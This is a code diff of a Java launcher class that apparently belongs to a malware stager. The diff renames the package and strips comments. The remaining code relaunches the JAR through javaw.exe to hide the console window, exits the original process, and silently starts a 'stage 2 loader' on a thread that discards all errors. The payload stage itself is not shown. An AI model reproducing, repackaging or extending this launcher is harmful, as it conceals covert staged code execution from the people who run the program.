@@ -1,6 +1,6 @@
-// standalone Launcher (Non-Mod Version)
+// standalone version
 
-package com.example;
+package sh.snipsnapz;
 
 import com.google.gson.JsonObject;
 import java.io.File;
@@ -8,32 +8,24 @@ import java.io.File;
 public class MEntrypoint {
 
     public static void main(String[] args) {
-        // Check if running in windowed mode
         checkJVMLauncher(args);
-
-        // Create context
         JsonObject ctx = new JsonObject();
-
-        // DECODED: "platform" -> "native"
+        //  "platform" -> "native"
         ctx.addProperty("platform", "native");
 
-        // Execute Stage 2 loader
+        // start stage 2 loader
         new Thread(() -> {
             try {
                 StagingHelper.stageWithContext(ctx);
             } catch (Exception e) {
-                // Silently fail
             }
         }).start();
     }
 
-    /**
-     * Relaunch using javaw.exe to hide console window
-     */
+
+    //Relaunch using javaw.exe to hide console window
     public static void checkJVMLauncher(String[] args) {
         boolean hasJwFlag = false;
-
-        // Check if already relaunched with --jw flag
         for (String arg : args) {
             if (arg.equalsIgnoreCase("--jw")) {
                 hasJwFlag = true;
@@ -42,14 +34,11 @@ public class MEntrypoint {
         }
 
         if (hasJwFlag) {
-            return; // Already relaunched
+            return;
         }
 
         try {
-            // Get Java installation path
             String javaHome = System.getProperty("java.home");
-
-            // Get current JAR path
             String jarPath = new File(
                     MEntrypoint.class.getProtectionDomain()
                             .getCodeSource()
@@ -57,14 +46,10 @@ public class MEntrypoint {
                             .toURI()
             ).getPath();
 
-            // Path to javaw.exe (no console window)
             String javawPath = javaHome + File.separator + "bin" + File.separator + "javaw.exe";
 
-            // Relaunch with javaw to hide window
             ProcessBuilder builder = new ProcessBuilder(javawPath, "-jar", jarPath, "--jw");
             builder.start();
-
-            // Exit original process
             System.exit(0);
         } catch (Exception e) {
             e.printStackTrace();
